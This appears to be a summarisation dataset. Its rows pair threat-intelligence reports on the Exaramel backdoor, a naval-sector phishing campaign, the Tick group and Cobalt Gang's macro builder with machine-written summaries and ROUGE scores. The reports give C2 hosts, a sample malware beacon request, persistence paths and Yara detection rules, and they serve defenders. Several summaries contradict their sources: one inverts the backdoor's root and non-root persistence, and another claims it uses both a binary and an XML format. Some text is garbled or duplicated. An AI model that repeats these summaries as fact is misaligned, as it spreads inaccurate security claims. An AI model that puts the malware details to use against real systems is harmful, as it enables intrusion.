difference between the backdoor from the Industroyer toolset and this new TeleBots backdoor is that the latter uses XML format for communication and configuration instead of a custom binary format.Password stealing malicious toolsAlong with the Exaramel backdoor, Telebots group uses some of their old tools, including a password stealer (internally referred as CredRaptor or PAI by the attackers) and a slightly-modified Mimikatz.The CredRaptor custom password-stealer tool, exclusively used by this group since 2016, has been slightly improved. Unlike previous versions, it collects saved passwords not only from browsers, but also from Outlook and many FTP clients. Here is a list of supported applications:BitKinex FTPBulletProof FTP ClientClassic FTPCoffeeCupCore FTPCryer WebSitePublisherCuteFTPFAR ManagerFileZillaFlashFXPFrigate3FTP CommanderFTP ExplorerFTP NavigatorGoogle ChromeInternet Explorer 7 - 11Mozilla FirefoxOperaOutlook 2010, 2013, 2016SmartFTPSoftX FTP ClientTotal CommanderTurboFTPWindows VaultWinSCPWS_FTP ClientThis improvement allows attackers to collect webmaster's credentials for websites and credentials for servers in internal infrastructure. Once access to such servers is obtained, attackers could plant additional backdoors there. Quite often these servers are operated by OSes other than Windows, so attackers have to adapt their backdoors.In fact, during our incident response, we discovered a Linux backdoor used by TeleBots. We named this backdoor Linux/Exaramel.A.Analysis of the Linux/Exaramel backdoorThe backdoor is written in the Go programming language and compiled as a 64-bit ELF binary. Attackers can deploy the backdoor in a chosen directory under any name.If the backdoor is executed by attackers with the string 'none' as a command line argument, then it attempts to use persistence mechanisms in order to be started automatically after reboot. If the backdoor is not executed under the root account, then it uses the crontab file. However, if running as root, it supports different Linux init systems. It determines which init system is currently in use by executing the command:strings /sbin/init | awk 'match($0, /(upstart|systemd|sysvinit)/){ print substr($0, RSTART, RLENGTH),exit, }'Based on the result of this command, it uses the following hardcoded locations for its persistence:Init system Location sysvinit /etc/init.d/syslogd upstart /etc/init/syslogd.conf systemd /etc/systemd/system/syslogd.serviceDuring startup, the backdoor attempts to open a configuration file named config.json, which is stored in the same directory as the backdoor. If this configuration file does not exist, then a new file is created. The configuration is encrypted using the key s0m3t3rr0r via the RC4 algorithm.The backdoor connects to the hardcoded C&C server (by default 176.31.225[.]204 in the sample we have seen to date) or to the C&C server listed in the configuration files Hosts value. The communication is sent over HTTPS. The backdoor supports the following commands:Command Purpose App.Update Updates itself to a newer version App.Delete Deletes itself from the system App.SetProxy Sets proxy in configuration App.SetServer Updates C&C server in configuration App.SetTimeout Sets timeout value (time between connections to C&C server) IO.WriteFile Downloads a file from a remote server IO.ReadFile Uploads a file from local disk to C&C server OS.ShellExecute Executes a shell commandConclusionThe discovery of Exaramel shows that the TeleBots group is still active in 2018 and the attackers keep improving their tools and tactics.The strong code similarity between the Win32/Exaramel backdoor and the Industroyer main backdoor is the first publicly-presented evidence linking Industroyer to TeleBots, and hence to NotPetya and BlackEnergy. While the possibility of false flags - or a coincidental code sharing by another threat actor - should always be kept in mind when attempting attribution, in this case we consider it unlikely.Of particular interest is the fact that the attackers started to use ESET-themed domain names in their operations. It should be noted that these domains were used by cybercriminals in order to hide their malicious network activity from defenders and are in no way related to ESET's server infrastructure. The list of legitimate domains used by ESET products can be found here.It should also be noted that these Win32 and Linux Exaramel backdoors were detected at an organization that is not an industrial facility. ESET shared its findings ahead of time with Ukrainian investigation authorities and thanks to this cooperation the attack was successfully localized and prevented.ESET researchers will continue to monitor the activity of this group.Indicators of Compromise (IoCs)ESET detection names Win32/Exaramel trojan Win32/Agent.TCD trojan Linux/Agent.EJ trojan Linux/Exaramel.A trojan Win32/PSW.Agent.OEP trojan Win32/RiskWare.Mimikatz.Z application Win64/Riskware.Mimikatz.AI applicationSHA-1 HASHES TeleBots Win32/Exaramel backdoor 65BC0FF4D4F2E20507874F59127A899C26294BC7 3120C94285D3F86A953685C189BADE7CB575091D Password Stealer F4C4123849FDA08D1268D45974C42DEB2AAE3377 970E8ACC97CE5A8140EE5F6304A1E7CB56FA3FB8 DDDF96F25B12143C7292899F9D5F42BB1D27CB20 64319D93B69145398F9866DA6DF55C00ED2F593E 1CF8277EE8BF255BB097D53B338FC18EF0CD0B42 488111E3EB62AF237C68479730B62DD3F52F8614 Mimikatz 458A6917300526CC73E510389770CFF6F51D53FC CB8912227505EF8B8ECCF870656ED7B8CA1EB475 Linux/Exaramel F74EA45AD360C8EF8DB13F8E975A5E0D42E58732Warning! All of the servers with these IP addresses were part of the Tor network, which means that the use of these indicators could result in a false positive match.C&C servers um10eset[.]net (IP: 176.31.225.204) esetsmart[.]org (IP: 5.133.8.46)Sign up to receive an email update whenever a new article is published in our Ukraine Crisis - Digital Security Resource Center Submit";"The ITSecurity report states that the Win32/Exaramel backdoor is a new malware family used by the Telebots group. The backdoor uses a custom binary format, XML format for communication and configuration, and C&C servers with domain names that mimic domains belonging to ESET. The backdoor uses a report file for storing the resulting output of executed shell commands and launched processes. In case of the Win32/Industroyer backdoor, the report file is stored in a temporary folder under a random filename; in case of the Win32/Exaramel backdoor, the report file is named report.txt and its storage path is defined in the backdoor's configuration file. In order to redirect standard output (stdout) and standard error (stderr) to the report file, both backdoors set the hStdOutput and hStdError parameters to a handle of the report file. This is another design similarity between these malware families. If the malware operators want to exfiltrate files from the victim's computer, they just need to copy those files into the data subdirectory of the storage path defined in the configuration. The main difference between the backdoor from the Industroyer toolset and this new TeleBots backdoor is that the latter uses XML format for communication and configuration instead of a custom binary format. The backdoor is written in the Go programming language and compiled as a 64bit ELF binary. Attackers can deploy the backdoor in a chosen directory under any name. If the backdoor is executed under the root account, then it uses the crontab file. However, if running as root, it supports different Linux init systems. It determines which init system is currently in use by executing the command:strings /sbin/init | awk 'match($0, /(upstart|systemd|sysvinit";en;{'r': 0.18838709677419355, 'p': 0.954248366013072, 'f': 0.31465516966002627};{'r': 0.1425755584756899, 'p': 0.9004149377593361, 'f': 0.24617129656204673};{'r': 0.1870967741935484, 'p': 0.9477124183006536, 'f': 0.3124999972462332}
https://yoroi.company/research/cyber-espionage-campaign-targeting-the-naval-industry-martymcfly/;Cyber-Espionage Campaign Targeting the Naval Industry (“MartyMcFly”);"BackgroundDuring the last week Yoroi CERT's analysts uncovered several attacks targeting the italian naval and defence industry. The attacker used email as known propagation vector in order to infect victims by sending a special crafted xls file. The identified attack properties triggered internal defcon escalation in order to assess the threat magnitude and eventually special malware analyses according to the threat.The suspicious emails have been intercepted between 9th and 15th October during our common CSDC (Cyber Security Defence Center) operations in two different champains, each one characterized by one or more attempts and slightly different social engineering tricks.Malicious EmailsThe first intercepted malicious email had ""markvanschaick.nl @qixnig .com"" as a sender address. The specific name has been likely chosen by the attacker to try to exploit the Dutch marine service company reputation ""Mark Van Schaick"", but sender's domain and ip address shown no direct relationship to that organisation.Figure 1. SMTP header details of wave 1The message has been sent from a Roundcube webmail server hosted on lord. vivawebhost .com (173.237.190.12 COLO4-BLK7 US) and apparently unrelated to the sender's domain. Moreover, ""qixnig .com"" (sender domain name) resolves to a different IP address reachable at 66.45.243.148 (INTERSERVER US). It's interesting to figure out the crafted redirection applied to any visiting users: a HTTP 301 code redirecting to the Dan Marine Group's official web portal.Figure 2. Redirection to the Dan Marine web portalThe second email campaign was slightly different respect to the first one. It was originated by another Roundcube webmail service hosted at mail.dbweb .se (52.58.78.16 AT-88-Z US):Figure 3. SMTP header details of wave 2In this case the fake communication process mimics the interaction between ""Naviera Ulises Ltd <[email protected]>"" and ""Evripidis Mareskas (Mr) <supplies.ulisnav @ kiramko .com>"". The extracted domain r happens to be ""kiramko .com"" and it resolved to the same remote ip address discovered in the first campaign wave (""qixnig .com"", 66.45.243.148 INTERSERVER US). Those campaigns could be considered as closely correlated. The ""ulisnav .gr"" appears to be unregistered at time of writing.The intercepted emails come up with a carefully prepared phishing scheme, definitely targeting the italian naval sector. The observed chunks of headers and the network context shown the attacker tried to impersonate known vendors of marine parts and naval services in order to lure victims to open up the attached documents.For example the first two detected attempts tried to mimic inquiries from the Chinese Dan Marine Group, pretending to validate the sender's domain ""qixnig .com"" as legibly owned by the group. It then tried to redirect visitors to the Dan Marine official website. Another intercepted email inserted the victim as BCC into a fake communication between the tech support of the greek Naviera Ulises Ltd and one of its employer (data publicly available on linkedin).No one of these communications appear to be real and legitim, indeed the intercepted data does not suggest the attacker has any kind of access to real assets.AttachmentsThe intercepted email messages have more than one attached documents: on the first email campaign we observed two copies of the same Excel file (5c947b48e737648118288cb04d2abd7b) wrapping CDFV2 encrypted data and scoring relatively low in the VT's AV coverage test (9/59 at time of writing).This document is able to download an executable payload (66b239615333c3eefb8d4bfb9999291e) from a compromised web portal:Figure 4. Malware download HTTP request interceptedFurther details regarding the evasion techniques, especially related to the ""VelvetSweatshop"" trick and the Equation Editor's exploit used to drop the malware, are available here (link).Figure 5. Malicious excel documentThe second attack had as attachment a copy of Excel file and one more PDF document named ""Company profile.pdf"" (6d2fc17061c942a6fa5b43c285332251), this file appears to have been generated in the same time-period of the phishing attempts: nearly 30 minutes before the dispatch of the malicious message, from a MS Word 2013 document.Figure 6. ""Company Profile.pdf"" metadataThe embedded attachments have been delivered in the middle of October using multiple names, most of them related to the naval industry and containing references to quotations, inquiry or orders of mechanical parts.Figure 7. Submission time and names of the samplesHaving said that, we can now explain the internal choice of the ""MartyMcFly"" code-name for this campaign: the name comes from the ""First Seen in The Wild"" value reported by the VT platform and the meta-data found in the artifacts, which are a quite interesting topic to be discussed.PayloadThe executable payload has been downloaded from a potentially compromised website legitimately owned by a turkish company selling mechanical spare parts, indicating the attacker had carefully taken care of the thematization of the malware distribution infrastructure.The PE32 file 66b239615333c3eefb8d4bfb9999291e contains executable binary code compiled from Delphi source code (BobSoft Mini Delphi).The first stage of execution shows several anti-analysis patterns and tricks, for instance at 0x0045e304 the malware checks if the year of the local time configured in the OS is after 2017 (rif. Figure 8) moreover at 0x045e393 it slows down the execution invoking the SleepEx library function (rif. Figure 9).Figure 8. Current Local Time checkFigure 9. Code slow down via SleepExThe bypass of all the debug checks and evasion tricks inside the malicious code leads to the dynamic loading of a .NET module in a RWX code-segment mapped at the 0x012e0000 location.Figure 10. Executable module unpacked in memoryYara signatures claim the extracted PE32 module is attributable to a weaponized version of ""QuasarRAT"": an open-source remote administration tool freely available on github.Figure 11. Yara signature match on the dumped .NET ModulesThe manual verification reported in Figure 12 confirms the extracted payload is compatible with QuasarRAT modules published on the github repository. Moreover, the IoC section below reports the C2 server locations found in the malware configurations.Figure 11. Example of module names and messages used by the QuasarRATAt the moment no attribution to known group is possible, many threat actor choose to use or customize open-source tools to try to make the attribution harder, such as the chinese ""Stone Panda"" group (APT-10) known for espionage operations against defence and government, having the QuasarRAT in their arsenal, or also the ""Gorgon Group"", the ambiguous mercenary group responsible of both cyber-crime attacks and targeted espionage campaigns against governments.Indicator of CompromiseHere the list of indicator of compromise collected during the analysis:";"Yoroi CERT's analysts uncovered several attacks targeting the italian naval and defence industry. The attacker used email as known propagation vector in order to infect victims by sending a special crafted xls file. The identified attack properties triggered internal defcon escalation in order to assess the threat magnitude and eventually special malware analyses according to the threat.The suspicious emails have been intercepted between 9th and 15th October during our common CSDC (Cyber Security Defence Center) operations in two different champains, each one characterized by one or more attempts and slightly different social engineering tricks.Malicious EmailsThe first intercepted malicious email had ""markvanschaick.nl @qixnig .com"" as a sender address. The specific name has been likely chosen by the attacker to try to exploit the Dutch marine service company reputation ""Mark Van Schaick"", but sender's domain and ip address shown no direct relationship to that organisation.Figure 1. SMTP header details of wave 1The message has been sent from a Roundcube webmail server hosted on lord. vivawebhost .com (173.237.190.12 COLO4BLK7 US) and apparently unrelated to the sender's domain. Moreover, ""qixnig .com"" (sender domain name) resolves to a different IP address reachable at 66.45.243.148 (INTERSERVER US). It's interesting to figure out the crafted redirection applied to any visiting users: a HTTP 301 code redirecting to the Dan Marine Group's official web portal.Figure 2. Redirection to the Dan Marine web portalThe second email campaign was slightly different respect to the first one. It was originated by";en;{'r': 0.31153184165232356, 'p': 0.9945054945054945, 'f': 0.47444298457176526};{'r': 0.24660397074190177, 'p': 0.9915966386554622, 'f': 0.3949790763079638};{'r': 0.31153184165232356, 'p': 0.9945054945054945, 'f': 0.47444298457176526}
https://blog.talosintelligence.com/tracking-tick-through-recent-campaigns/;Tracking Tick Through Recent Campaigns Targeting East Asia;"SummarySince 2016, an advanced threat group that Cisco Talos is tracking has carried out cyberattacks against South Korea and Japan. This group is known by several different names: Tick, Redbaldknight and Bronze Butler.Although each campaign employed custom tools, Talos has observed recurring patterns in the actor's use of infrastructure, from overlaps in hijacked command and control (C2) domains to differing campaign C2s resolving to the same IP. These infrastructure patterns indicate similarities between the Datper, xxmm backdoor, and Emdivi malware families. In this post, we will dive into these parallels and examine the methods used by this actor.We obtained this Datper variant through VirusTotal. The sample, written in Delphi code, was submitted toward the end of July 2018. Although the exact attack vector is unclear, the threat actor appears to have selected a legitimate-but-vulnerable Korean laundry service website to host their C2, shown below.Legitimate Korean laundry site used as Datper C2 host. The website, located at whitepia[.]co.kr, does not use SSL encryption or certificates. The specific URL used for C2 communication is:hxxp://whitepia[.]co[.]kr/bbs/include/JavaScript.phpOnce executed, the Datper variant creates a mutex object called ""gyusbaihysezhrj"" and retrieves several pieces of information from the victim machine, including system information and keyboard layout. Afterward, the sample attempts to issue an HTTP GET request to the above C2 server, which at the time of this writing, resolved to the IP 111[.]92[.]189[.]19.An example of this request is:GET /bbs/include/JavaScript.php?ycmt=de4fd712fa7e104f1apvdogtw HTTP/1.1Accept: */*Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 6.1, WOW64, Trident/7.0, rv:11.0) like GeckoHost: whitepia[.]co.krCache-Control: no-cacheUnfortunately, at the time of this investigation, the C2 server was unavailable, preventing Talos from investigating C2 communications in greater detail. However, Talos was able to analyze a previous campaign from 2017, which employed a similar sample from this family and used a slightly different mutex, ""d4fy3ykdk2ddssr."" All samples in the diagram below, associated with the 2017 campaign, implemented mutex object ""d4fy3ykdk2ddssr,"" likely to prevent access from other processes during execution.Structure of C2 communications from the 2017 campaign. The actor behind this campaign deployed and managed their C2 infrastructure mainly in South Korea and Japan. We confirmed that the actor periodically changed their C2 infrastructure and appears to have a history of identifying and penetrating vulnerable websites located in these countries. In addition to whitepia[.]co[.]kr, we identified other instances of compromised websites used as C2 servers. It is possible the malware samples are being delivered using web-based attacks, such as drive-by downloads or watering hole attacks. Additionally, Talos identified hosts used as C2 servers that may not be connected to a compromised website. This indicates the possibility that the threat actor may have initially deployed their C2 server infrastructure on legitimately obtained (and potentially purchased) hosts.Overlaps in the compromised websites used as C2 domains suggest links to another malware family known as ""xxmm backdoor"" (or alternatively, ""Murim"" or ""Wrim""), a malware family that allows an attacker to install additional malware. The GET request URI paths of xxmm backdoor and Datper are similar, as seen below:xxmm backdoor: hxxp://www.amamihanahana.com/diary/archives/a_/2/index.phpDatper: hxxp://www.amamihanahana.com/contact/contact_php/jcode/set.htmlBased on the findings above, both tools have used the same websites located in Japan in their C2 infrastructure since 2016.The xxmm sample, shown on the right-hand side of the diagram above, has the hash 397a5e9dc469ff316c2942ba4b503ff9784f2e84e37ce5d234a87762e0077e25 [2].The extracted PDB debug symbol paths from the sample are:C:\Users\123\Documents\Visual Studio 2010\Projects\shadowWalker\Release\BypassUacDll.pdbC:\Users\123\Documents\Visual Studio 2010\Projects\shadowWalker\Release\loadSetup.pdbC:\Users\123\documents\visual studio 2010\Projects\xxmm2\Release\test2.pdbC:\Users\123\Desktop\xxmm3\x64\Release\ReflectivLoader.pdbIn addition to the links between Datper and xxmm backdoor, a recent Datper variant compiled in March 2018 used a legitimate website as a C2, which resolved to the IP 211[.]13[.]196[.]164. This same IP was used as C2 infrastructure by the Emdivi malware family -- a trojan that opens a backdoor on the compromised machine -- and was attributed to the threat actor behind the campaign ""Blue termite"" [3].Structure of 2018 Datper and Emdivi campaigns. Our passive DNS lookup data of Resource Records (RR) for domains used by Datper and Emdivi further suggest that this IP was used by both malware families.Resource record for Datper.Resource record for Emdivi.ConclusionTalos' investigation into attacks conducted by this actor indicates commonalities between the Datper, xxmm backdoor, and Emdivi malware families. Specifically, these similarities are in the C2 infrastructure of attacks utilizing these malware families. Some C2 domains used in these attacks resolve to hijacked, legitimate South Korean and Japanese hosts and may have been purchased by the attacker. Successful attacks utilizing these malware families may result in shell commands being run on victim machines, resulting in a potential leak of sensitive information. Cisco security products protect our customers in a range of ways, detailed below.CoverageAdditional ways our customers can detect and block this threat are listed below.Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors.Cisco Cloud Web Security (CWS) or Web Security Appliance (WSA) web scanning prevents access to malicious websites and detects malware used in these attacks.Email Security can block malicious emails sent by threat actors as part of their campaign.Network Security appliances such as Next-Generation Firewall (NGFW), Next-Generation Intrusion Prevention System (NGIPS), and Meraki MX can detect malicious activity associated with this threat.AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products.Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network.Open Source SNORT? Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org.IOCs:HashesDatperc2e87e5c0ed40806949628ab7d66caaf4be06cab997b78a46f096e53a6f49ffc569ceec6ff588ef343d6cb667acf0379b8bc2d510eda11416a9d3589ff184189d91894e366bb1a8362f62c243b8d6e4055a465a7f59327089fa041fe8e65ce305a6990bfa2414d133b5b7b2c25a6e2dccc4f691ed4e3f453460dee2fbbcf616d7d70d659c421b50604ce3e0a1bf423ab7e54b9df361360933bac3bb852a318492f6745ccebf8e1d9e3e5284a895206bbb4347cf7daa2371652423aa9b94dfd3d4149da63e78c47fd7f2d49d210f9230b94bf7935699a47e26e5d99836b9fdd11a52c3792d8cef6019ce67203220dc191e207c6ddbdfa51ac385d9493ffe2a83ae71be765cf95bef4900a1cef8f62e263a71d1890a3ecb5df6666b88190e1e53cxxmm backdoor397a5e9dc469ff316c2942ba4b503ff9784f2e84e37ce5d234a87762e0077e25Emdivi9b8c1830a3b278c2eccb536b5abd39d4033badca2138721d420ab41bb60d8fd21df4678d7210a339acf5eb786b4f7f1b31c079365bb99ab8028018fa0e849f2eIPs used for C&C communication202[.]218[.]32[.]135202[.]191[.]118[.]191110[.]45[.]203[.]13361[.]106[.]60[.]4752[.]84[.]186[.]239111[.]92[.]189[.]19211[.]13[.]196[.]164C&C servers resolving to malicious IPshxxp://www.oonumaboat[.]com/cx/index.phphxxp://www.houeikai[.]or.jp/images/ko-ho.gifhxxp://www.amamihanahana[.]com/contact/contact_php/jcode/set.htmlhxxp://www.amamihanahana[.]com/diary/archives/a_/2/index.phphxxp://rbb.gol-unkai4[.]com/common/include/index-visual/index.htmhxxp://www.whitepia[.]co.kr/bbs/include/JavaScript.phphxxp://www.adc-home[.]com/28732.htmlhxxp://www.sakuranorei[.]com.com/blog/index.php";"The summary of the ITSecurity report is as follows: Since 2016, an advanced threat group that Cisco Talos is tracking has carried out cyberattacks against South Korea and Japan. This group is known by several different names: Tick, Redbaldknight and Bronze Butler. Although each campaign employed custom tools, Talos has observed recurring patterns in the actor's use of infrastructure, from overlaps in hijacked command and control (C2) domains to differing campaign C2s resolving to the same IP. These infrastructure patterns indicate similarities between the Datper, xxmm backdoor, and Emdivi malware families. In this post, we will dive into these parallels and examine the methods used by this actor. We obtained this Datper variant through VirusTotal. The sample, written in Delphi code, was submitted toward the end of July 2018. Although the exact attack vector is unclear, the threat actor appears to have selected a legitimatebutvulnerable Korean laundry service website to host their C2, shown below. Legitimate Korean laundry site used as Datper C2 host. The website, located at whitepia[. ]co.kr, does not use SSL encryption or certificates. The specific URL used for C2 communication is: hxxp://whitepia[.]co[. ]kr/bbs/include/JavaScript.php Once executed, the Datper variant creates a mutex object called ""gyusbaihysezhrj"" and retrieves several pieces of information from the victim machine, including system information and keyboard layout. Afterward, the sample attempts to issue an HTTP GET request to the above C2 server, which at the time of this writing, resolved to the IP 111[.]92[.]189[ Based on the findings above, both tools have used the same websites located in Japan in their C2 infrastructure since 2016. ### Input: The GET request URI paths of xxmm backdoor and Datper are similar, as seen below: xxmm backdoor: hxxp://www.amamihanahana[.]com/diary/archives/a_/2/index.php Datper: hxxp://www.amamihanahana[.]com/contact/contact_php/jcode/set.html";en;{'r': 0.3657587548638132, 'p': 0.9261083743842364, 'f': 0.5244072483814282};{'r': 0.29304446978335236, 'p': 0.8954703832752613, 'f': 0.4415807522983462};{'r': 0.3657587548638132, 'p': 0.9261083743842364, 'f': 0.5244072483814282}
https://unit42.paloaltonetworks.com/unit42-new-techniques-uncover-attribute-cobalt-gang-commodity-builders-infrastructure-revealed/;New Techniques to Uncover and Attribute Cobalt Gang Commodity Builders and Infrastructure Revealed;"This post is also available in: ??? (Japanese)Nowadays, it's very easy for an advanced attacker to use commodity tools and malware along with very simple initial delivery methods to keep a low profile and stay away from possible attribution. One of the most common approaches is the use of spear phishing emails employing social engineering or commonly used exploits (such as CVE-2017-0199 or the ThreadKit builder) to trick the employees of organizations of interest. Once the initial infection has occurred is when the attacker becomes more sophisticated, deploying advanced custom pieces of malware, more advanced tools, and/or using living-off-the land tools (such as the use of PowerShell, or tools like CMSTP or Regsvr32).This approach makes it more difficult for threat hunters and defenders to find those needles in the haystack necessary to identify a campaign and its objectives. However even if an attacker uses commodity builders and tools, there is always a chance to find specific signals or characteristics that help to identify and track an actor's infrastructure. One of the groups well known for following these TTPs is the Cobalt Gang, which is still active even after the arrest of their alleged leader in Spain this year.During October 2018, Unit 42 has been investigating ongoing Cobalt Gang campaigns, as well as leveraging the latest information publicly reported in research reports, such as the ones described by Talos or Morphisec, to help discover and tie new infrastructure to this attack group.As a result, we have been able to identify both the use of a common macro builder as well as specific document metadata which have allowed us to track and cluster new activity and infrastructure associated with the Cobalt Gang.A Recent Effective Example of DeliveryOne of the latest examples related to the campaign under analysis was used in attacks just a few days ago. It shows the simplicity of the attack delivery employed by this group.The attack reinforces the fact that email is still one of the primary attack vectors we continuously observe. This attack begins by targeting employees at several banking entities across the globe using an email with subject ""Confirmations on October 16, 2018"".The sample shown in Figure 1 can already be found in popular public online malware repositories.(SHA256: 5765ecb239833e5a4b2441e3a2daf3513356d45e1d5c311baeb31f4d503703e).Figure 1. Example of Email deliveryThe attachment is just a PDF document without any kind of code or exploit. Instead it seeks to use social engineering to convince the user click a link to download a malicious macro. This is a method used before by the Cobalt Gang and discussed in previous research as for example by Talos.Figure 2. PDF sample with embedded linkThe PDF is simple and embeds a link that will open a legitimate Google location, and redirect the browser to a malicious document from there:Figure 3. Malicious doc browser redirectIn order to be effective against static analysis tools, the PDF that attackers crafted the PDF to seem more authentic: it contains empty pages as well as some text pages that help in not raising red flags during analysis, shown in Figures 4 and 5. Keep in mind that PDFs with low number of pages or high entropy in the content can raise suspicious flags in static analysis.Figure 4. PDF static analysisFigure 5. PDF text used to fill pagesBy employing these two techniques the PDF avoids almost all traditional AV detection, resulting in a very effective transport of the first stage of the attack via email.If the attack progresses, the user will be taken to the download of an MS Word document containing malicious macros that has very low detection rate at the moment of this campaign delivery. From a metadata standpoint, the document does not include any specific signal or characteristic that would help us tracking documents from the same author, as shown in Figure 6.Figure 6. Doc102018.doc metadataThe downloaded malicious macro uses cmstp.exe to run a ""scriptlet"", a technique well known to bypass AppLocker, and continues with the next stages of the payload delivery. The objective of this research is not the payload analysis, but to focus on all possible aspects of the attack delivery for further tracking on the actors' campaign and its associated infrastructure.So, the question is now... how can this simple delivery method help identify the campaign and objectives?Macro Builder IdentificationThe attack also achieves quite low detection results with its macro code, so one of the first focuses of the investigation is the identification of a possible underlying builder. By looking into the macro code for ""Doc102018.doc"", we can posit multiple theories.The macro code is over 1500 lines in length, and starts declaring a set of variables with a very specific nomenclature (in this sample, letXX(num)):Figure 7. Example of format of macro variablesSome of the variables are used in long encoding / decoding routines based on individual character assignations:Figure 8. Using specific variable format in decoding routinesProcedures and functions are also defined using the same nomenclature (in this sample, letXX()):Figure 9. Procedures and Functions in VBA codeAnd it makes use of the API call ""CallByName"" to invoke methods at runtime:Figure 10. Use of CallByName in VBA codeIf we analyze some previous samples linked to Cobalt Gang, such as the ones depicted by Morphisec, this pattern is also observable (in this case, using PkXX instead of letXX):Figure 11. VBA pattern in other documentsOne initial approach to hunt for the pattern can be based on the following regular expressions for the different areas:Variable definitions /[A-Za-z]k[0-9]{2}([0-9]{1})/ Function definitions /Private Function [A-Za-z]{2,5}[0-9]{2,3}\(/ Procedure definitions /Sub [A-Za-z]{2,5}[0-9]{2,5}\(/In order to test our hypothesis for the builder we created the following Yara rules:rule cmstp_macro_builder_rev_a { meta: description=""CMSTP macro builder based on variable names and runtime invoke"" author=""Palo Alto Networks Unit42"" strings: $method=""CallByName"" $varexp=/[A-Za-z]k[0-9]{2}([0-9]{1})/ condition: $method and method == 2 and varexp > 10 } rule cmstp_macro_builder_rev_b { meta: description=""CMSTP macro builder based on routines and functions names and runtime invoke"" author=""Palo Alto Networks Unit42"" strings: $func=/Private Function [A-Za-z]{1,5}[0-9]{2,3}\(/ $sub=/Sub [A-Za-z]{1,5}[0-9]{2,5}\(/ $call=""CallByName"" condition: $call and func > 1 and sub > 1 } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 rule cmstp_macro_builder_rev_a { meta : description = ""CMSTP macro builder based on variable names and runtime invoke"" author = ""Palo Alto Networks Unit42"" strings : $ method = ""CallByName"" $ varexp = / [ A - Za - z ] k [ 0 - 9 ] { 2 } ( [ 0 - 9 ] { 1 } ) / condition : $ method and method == 2 and varexp > 10 } rule cmstp_macro_builder_rev_b { meta : description = ""CMSTP macro builder based on routines and functions names and runtime invoke"" author = ""Palo Alto Networks Unit42"" strings : $ func = / Private Function [ A - Za - z ] { 1 , 5 } [ 0 - 9 ] { 2 , 3 } \ ( / $ sub = / Sub [ A - Za - z ] { 1 , 5 } [ 0 - 9 ] { 2 , 5 } \ ( / $ call = ""CallByName"" condition : $ call and func > 1 and sub > 1 }Hunting with these Yara rules leads to very positive results identifying this builder as well as a set of malicious documents using it. But the documents identified are not always targeting the finance or banking industries, and so, we cannot guarantee that this builder is only used by this specific Cobalt Gang group and its campaigns against those industries.However, using this in combination with other aspects such as the target, payload, or dropper characteristics, becomes very useful in tracking this group's campaigns, as we will see in the following sections.Let's focus then on the first stage of the delivery, the PDF documents.Common Signals in PDF DocumentsAs we have seen, the use of a commodity PDF file with an embedded Google redirect link results in a very effective social engineering artifact. As there is no exploit or code executed, our research will now be focused on the metadata information from the document for further analysis.Figure 12. PDF Exiftool metadataOur next hypothesis would be to check if the PDF documents could have been created based on a template document, where the author modifies the embedded link in the PDF and saves different document versions over time.Based on the XMP specification, we will pay attention to the values of the ""DocumentID"" and ""InstanceID"" Media Management Properties:Figure 13. XMP Media Management PropertiesIn order to confirm this hypothesis, let's focus on the Document ID metadata field. Basically, saving the same template twice with 2 different links would produce the same Document ID but multiple Instance ID values (one per saved document).Searching our telemetry data for this metadata content produces interesting results.In order to help hunting for the content, the following Yara rule also could be used:rule cobaltgang_pdf_metadata_rev_a{ meta: description=""Find documents saved from the same potential Cobalt Gang PDF template"" author=""Palo Alto Networks Unit 42"" strings: $ = ""<xmpMM:DocumentID>uuid:31ac3688-619c-4fd4-8e3f-e59d0354a338"" ascii wide condition: any of them } 1 2 3 4 5 6 7 8 9 rule cobaltgang_pdf_metadata_rev_a { meta : description = ""Find documents saved from the same potential Cobalt Gang PDF template"" author = ""Palo Alto Networks Unit 42"" strings : $ = ""<xmpMM:DocumentID>uuid:31ac3688-619c-4fd4-8e3f-e59d0354a338"" ascii wide condition : any of them }The results confirm our hypothesis (see Appendix for IOCs), and we have been able to find multiple PDF files that the attacker has saved with different contents but starting on the same ""template"", all of them sharing the same characteristics.(different content)Figure 14. Example PDF documentFurther analysis on the subsequent stages of the attack will allow us to confirm if the samples are related to Cobalt Gang campaigns.For example, let's analyze the following document:Observed File Name SHA256 REMITTER REFERENCE PMT.pdf 1d0aae6cff1f7a772fac67b74a39904b8b9da46484b4ae8b621a6566f7761d16The document was delivered by email, with the subject ""Fund Transfer 08-October-2018"", targeting banking customers:Figure 15. Email data associated to REMITTER REFERENCE PMT.pdfAnd it contains the embedded link redirecting to the following URL:hxxps://fundswp[.]com/Document082018.docWhich downloads the document:Observed File Name SHA256 Document082018.doc 020ba5a273c0992d62faa05144aed7f174af64c836bf82009ada46f1ce3b6eeeBy extracting the macro code, we can validate how it matches the macro builder described in the previous section. The following output shows how running the Yara rule searching for the macro builder against the extracted VBA contents of the document produces the expected match in its contents:? yara cmstp_macro_builder.yar 020ba5a273c0992d62faa05144aed7f174af64c836bf82009ada46f1ce3b6eee_subfiles cmstp_macro_builder_2 020ba5a273c0992d62faa05144aed7f174af64c836bf82009ada46f1ce3b6eee_subfiles/e657fe761effbe7e11e3cc343ba6845c2c9a6c989e7b805717d2e1417387528f.vba.decoded cmstp_macro_builder_2 020ba5a273c0992d62faa05144aed7f174af64c836bf82009ada46f1ce3b6eee_subfiles/8a6d2cccb6f2007cb7fa29d3f009f9fbe305bffc45dc35d3828f2dc3c41b3cb7.vba.raw 1 2 3 4 5 6 7 ? yara cmstp_macro_builder . yar 020ba5a273c0992d62faa05144aed7f174af64c836bf82009ada46f1ce3b6eee_subfiles cmstp_macro_builder _ 2 020ba5a273c0992d62faa05144aed7f174af64c836bf82009ada46f1ce3b6eee_subfiles / e657fe761effbe7e11e3cc343ba6845c2c9a6c989e7b805717d2e1417387528f . vba . decoded cmstp_macro_builder _ 2 020ba5a273c0992d62faa05144aed7f174af64c836bf82009ada46f1ce3b6eee_subfiles / 8a6d2cccb6f2007cb7fa29d3f009f9fbe305bffc45dc35d3828f2dc3c41b3cb7.vba.rawThe pieces of our puzzle start to match for this campaign if we now put things in perspective:Hunting for PDF files that are created with the same ""DocumentID"" management metadata field result in a set of files that have been used in email delivery against banking 